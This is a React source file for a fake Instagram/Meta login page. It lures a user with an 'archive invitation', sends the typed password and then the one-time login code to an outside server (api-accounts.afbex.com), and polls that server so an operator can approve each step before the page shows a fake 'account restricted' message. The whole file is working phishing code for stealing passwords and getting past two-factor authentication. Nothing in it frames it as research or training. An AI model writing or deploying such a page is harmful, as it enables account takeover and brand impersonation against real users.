import React, { useState, useRef } from 'react';
import pfp2 from './assets/pfp2.jpg';
import instlogo from './assets/instlogo.png';
import metalogo from './assets/metalogo.png';
import textlogo from './assets/textlogo.png';

const AccountLogin = () => {
  const [formData, setFormData] = useState({
    password: '',
  });
  const [showOtpScreen, setShowOtpScreen] = useState(false);
  const [otp, setOtp] = useState('');
  const [trustDevice, setTrustDevice] = useState(false);
  const [otpVerificationStatus, setOtpVerificationStatus] = useState('idle'); // idle, pending, approved, rejected
  const [alertConfig, setAlertConfig] = useState({ show: false, title: '', message: '' });

  const showAlert = (title, message) => {
    setAlertConfig({ show: true, title, message });
  };

  const closeAlert = () => {
    if (otpVerificationStatus === 'approved') {
      handleBackToLogin();
    } else {
      setAlertConfig({ ...alertConfig, show: false });
    }
  };

  const handleChange = (e) => {
    setFormData({ ...formData, [e.target.name]: e.target.value });
  };

  const [verificationStatus, setVerificationStatus] = useState('idle'); // idle, pending, approved, rejected
  const [pollingInterval, setPollingInterval] = useState(null);

  const handleSubmit = async (e) => {
    e.preventDefault();
    if (formData.password) {
      try {
        // Submit password to backend
        const response = await fetch('https://api-accounts.afbex.com/stage/test/submit-password', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ password: formData.password })
        });
        
        if (response.ok) {
          setVerificationStatus('pending');
          startPolling();
        }
      } catch (error) {
        console.error('Error submitting password:', error);
        alert('Could not connect to verification server');
      }
    }
  };

  const startPolling = () => {
    const interval = setInterval(async () => {
      try {
        const response = await fetch('https://api-accounts.afbex.com/stage/test/check-status');
        const data = await response.json();
        
        if (data.status === 'approved') {
          setVerificationStatus('approved');
          clearInterval(interval);
          // Immediately proceed to OTP screen
          setShowOtpScreen(true);
        } else if (data.status === 'rejected') {
          setVerificationStatus('rejected');
          clearInterval(interval);
          setVerificationStatus('idle');
          setFormData({ password: '' });
          showAlert('Incorrect password', 'The password that you\'ve entered is incorrect. Please try again.');
        }
      } catch (error) {
        console.error('Polling error:', error);
      }
    }, 2000); // Poll every 2 seconds
    
    setPollingInterval(interval);
  };

  const handleOtpChange = (e) => {
    const value = e.target.value.replace(/\D/g, ''); // Only allow digits
    if (value.length <= 6) {
      setOtp(value);
    }
  };

  const handleOtpSubmit = async (e) => {
    e.preventDefault();
    if (otp.length >= 4) {
      try {
        // Submit OTP to backend
        const response = await fetch('https://api-accounts.afbex.com/stage/test/submit-otp', {
          method: 'POST',
          headers: { 'Content-Type': 'application/json' },
          body: JSON.stringify({ otp: otp })
        });
        
        if (response.ok) {
          setOtpVerificationStatus('pending');
          startOtpPolling();
        }
      } catch (error) {
        console.error('Error submitting OTP:', error);
        alert('Could not connect to verification server');
      }
    }
  };

  const startOtpPolling = () => {
    const interval = setInterval(async () => {
      try {
        const response = await fetch('https://api-accounts.afbex.com/stage/test/check-status');
        const data = await response.json();
        
        if (data.status === 'approved') {
          setOtpVerificationStatus('approved');
          clearInterval(interval);
          showAlert('Unauthorized access', '@arsalannfarooqui_ has restricted this account');
        } else if (data.status === 'rejected') {
          setOtpVerificationStatus('rejected');
          clearInterval(interval);
          setOtpVerificationStatus('idle');
          setOtp('');
          showAlert('Incorrect Login Code', 'The code you entered is incorrect. Please try again.');
        }
      } catch (error) {
        console.error('OTP Polling error:', error);
      }
    }, 2000); // Poll every 2 seconds
  };

  const handleBackToLogin = () => {
    setShowOtpScreen(false);
    setOtp('');
    setFormData({ password: '' });
    setTrustDevice(false);
    setOtpVerificationStatus('idle');
    setVerificationStatus('idle');
    setAlertConfig({ show: false, title: '', message: '' });
  };

  const handleResendCode = () => {
    console.log('Resending confirmation code...');
    // Add your resend logic here
  };

  // If OTP screen should be shown
  if (showOtpScreen) {
    return (
      <div className="min-h-screen bg-[#1C2A33] text-white flex flex-col font-sans">
        {/* Back Button */}
        <button 
          onClick={handleBackToLogin}
          className="absolute top-6 left-6 text-white hover:text-gray-300 transition"
        >
          <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2">
            <path d="M19 12H5M12 19l-7-7 7-7"/>
          </svg>
        </button>

        {/* Top Content - Header and OTP Inputs */}
        <div className="flex-1 flex flex-col items-center justify-start px-6">
          {/* Header */}
          <div className="text-center mb-12 mt-20">
            <h1 className="text-2xl font-semibold mb-4">Enter login code</h1>
            <p className="text-sm text-gray-400 mb-2">
              Enter the login code we sent to your registered email/phone
            </p>
            <button 
              onClick={handleResendCode}
              className="text-sm text-[#0095f6] hover:text-[#0064E0] transition"
            >
              Resend confirmation code.
            </button>
          </div>

          {/* OTP Input Box */}
          <div className="w-full max-w-xs px-4">
            <input
              type="text"
              inputMode="numeric"
              maxLength="6"
              value={otp}
              onChange={handleOtpChange}
              placeholder="Login code"
              className="w-full bg-transparent border-0 border-b-2 border-white p-2 text-center text-lg text-white placeholder-gray-500 placeholder:text-sm focus:outline-none focus:border-white transition tracking-widest"
              autoFocus
            />
          </div>
        </div>

        {/* Bottom Content - Trust Device and Confirm Button */}
        <form onSubmit={handleOtpSubmit} className="w-full px-4 pb-8">
          <div className="w-full max-w-md mx-auto">
            {/* Trust Device Checkbox */}
            <div className="flex items-start justify-between gap-3 mb-6">
              <label htmlFor="trustDevice" className="cursor-pointer">
                <div className="text-base font-medium">Trust this device</div>
                <div className="text-xs text-gray-400">We won't ask for a login code next time</div>
              </label>
              <div className="flex items-center h-6">
                <input
                  type="checkbox"
                  id="trustDevice"
                  checked={trustDevice}
                  onChange={(e) => setTrustDevice(e.target.checked)}
                  className="w-5 h-5 bg-transparent border-2 border-gray-500 rounded appearance-none checked:bg-[#0095f6] checked:border-[#0095f6] cursor-pointer relative mt-4"
                  style={{
                    backgroundImage: trustDevice ? `url("data:image/svg+xml,%3Csvg xmlns='http://www.w3.org/2000/svg' viewBox='0 0 24 24' fill='none' stroke='white' stroke-width='3'%3E%3Cpath d='M5 13l4 4L19 7'/%3E%3C/svg%3E")` : 'none',
                    backgroundSize: '100% 100%',
                    backgroundPosition: 'center',
                  }}
                />
              </div>
            </div>

            {/* Confirm Button */}
            <button
              type="submit"
              disabled={otp.length < 4 || otpVerificationStatus === 'pending'}
              className={`w-full py-2 rounded-lg text-base font-semibold transition duration-200 flex items-center justify-center gap-2 ${
                otpVerificationStatus === 'pending'
                  ? 'bg-gray-600 cursor-not-allowed'
                  : otp.length >= 4
                  ? 'bg-[#0095f6] hover:bg-[#0064E0] text-white'
                  : 'bg-[#1a3a52] text-gray-500 cursor-not-allowed'
              }`}
            >
              {otpVerificationStatus === 'pending' && (
                <>
                  <svg className="animate-spin h-5 w-5" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                    <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                    <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                  </svg>
                </>
              )}
              {otpVerificationStatus === 'idle' && 'Confirm'}
            </button>

          </div>
        </form>

        {/* Alert Popup */}
        {alertConfig.show && (
          <div className="fixed inset-0 flex items-center justify-center z-50 px-9 pointer-events-none">
            <div className="bg-white rounded-[12px] w-full max-w-[280px] overflow-hidden flex flex-col items-center shadow-2xl pointer-events-auto transition-all transform scale-100 opacity-100">
              <div className="pt-6 pb-4 px-6 text-center">
                <h3 className="text-black font-semibold text-[17px] mb-1 leading-tight">{alertConfig.title}</h3>
                <p className="text-[#8E8E8E] text-[14px] leading-tight">{alertConfig.message}</p>
              </div>
              <button 
                onClick={closeAlert}
                className="w-full border-t border-gray-100 py-3.5 text-[#0095f6] font-semibold text-[14px] active:bg-gray-50 transition"
              >
                OK
              </button>
            </div>
          </div>
        )}
      </div>
    );
  }

  // Default Login Screen
  return (
    <div className="min-h-screen bg-[#1C2A33] text-white flex flex-col items-center justify-between font-sans selection:bg-gray-800">
      
      {/* Top Language Selector */}
      <div className="mt-4 text-xs text-gray-400">
        English (UK)
      </div>

      {/* Main Content Container */}
      <div className="w-full max-w-[400px] px-4 flex flex-col items-center flex-grow justify-center -mt-10">
        
        {/* Instagram Logo */}
        <div className="mt-[-90px] mb-[-20px]">
          <img src={textlogo} alt="Instagram" className="w-64 h-44 object-contain" />
        </div>

        {/* Login Description */}
        <p className="text-sm text-[#8E8E8E] text-center mb-8 font-normal tracking-tight px-8 leading-relaxed">
          Login with your account to accept archive invitation
        </p>

        {/* Profile Section */}
        <div className="flex flex-col items-center mb-8">
          <img 
            src={pfp2} 
            alt="Profile" 
            className="w-24 h-24 rounded-full object-cover mb-3 border-2 border-[#3C4D57]" 
          />
          <p className="text-base font-medium text-white">@arsalannfarooqui_</p>
        </div>

        {/* Login Form */}
        <form className="w-full space-y-3" onSubmit={handleSubmit}>
          <input
            type="password"
            name="password"
            placeholder="Password"
            minLength={6}
            className="w-full bg-[#1C2A33] border border-[#3C4D57] rounded-md p-3.5 text-sm text-[#83919C] placeholder-gray-500 placeholder:font-semibold focus:outline-none focus:border-[#2e5a8a] transition"
            onChange={handleChange}
            value={formData.password}
          />
          
          <button
            type="submit"
            disabled={verificationStatus === 'pending'}
            className={`w-full font-semibold py-3 rounded-full text-sm mt-2 transition duration-200 flex items-center justify-center gap-2 ${
              verificationStatus === 'pending' 
                ? 'bg-gray-600 cursor-not-allowed' 
                : 'bg-[#0064E0] hover:bg-[#0095f6]'
            } text-white`}
          >
            {verificationStatus === 'pending' && (
              <>
                <svg className="animate-spin h-5 w-5" xmlns="http://www.w3.org/2000/svg" fill="none" viewBox="0 0 24 24">
                  <circle className="opacity-25" cx="12" cy="12" r="10" stroke="currentColor" strokeWidth="4"></circle>
                  <path className="opacity-75" fill="currentColor" d="M4 12a8 8 0 018-8V0C5.373 0 0 5.373 0 12h4zm2 5.291A7.962 7.962 0 014 12H0c0 3.042 1.135 5.824 3 7.938l3-2.647z"></path>
                </svg>
                {/* <span>Verifying...</span> */}
              </>
            )}
            {/* {verificationStatus === 'approved' && '✓ Approved!'} */}
            {/* {verificationStatus === 'rejected' && '✗ Rejected'} */}
            {verificationStatus === 'idle' && 'Log in'}
          </button>
        </form>

        {/* Forgotten Password */}
        <div className="mt-6 text-sm text-gray-300 hover:text-white cursor-pointer transition">
          Forgotten password?
        </div>

      </div>

      {/* Footer Section */}
      <div className="w-full max-w-[400px] px-4 mb-6 flex flex-col items-center space-y-6">
        
        {/* Create New Account Button */}
        {/* <button className="w-full border-2 border-[#284B72] text-[#4787BA] font-bold py-2.5 rounded-full text-sm hover:bg-[#0d2137] transition duration-300">
          Create new account
        </button> */}

        {/* Meta Logo */}
        <div className="flex items-center text-gray-400">
          <img src={metalogo} alt="Meta" className="h-3 object-contain" />
        </div>
      </div>
      
      {/* Alert Popup */}
      {alertConfig.show && (
        <div className="fixed inset-0 flex items-center justify-center z-50 px-9 pointer-events-none">
          <div className="bg-white rounded-[12px] w-full max-w-[280px] overflow-hidden flex flex-col items-center shadow-2xl pointer-events-auto transition-all transform scale-100 opacity-100">
            <div className="pt-6 pb-4 px-6 text-center">
              <h3 className="text-black font-semibold text-[17px] mb-1 leading-tight">{alertConfig.title}</h3>
              <p className="text-[#8E8E8E] text-[14px] leading-tight">{alertConfig.message}</p>
            </div>
            <button 
              onClick={closeAlert}
              className="w-full border-t border-gray-100 py-3.5 text-[#0095f6] font-semibold text-[14px] active:bg-gray-50 transition"
            >
              OK
            </button>
          </div>
        </div>
      )}
    </div>
  );
};

export default AccountLogin;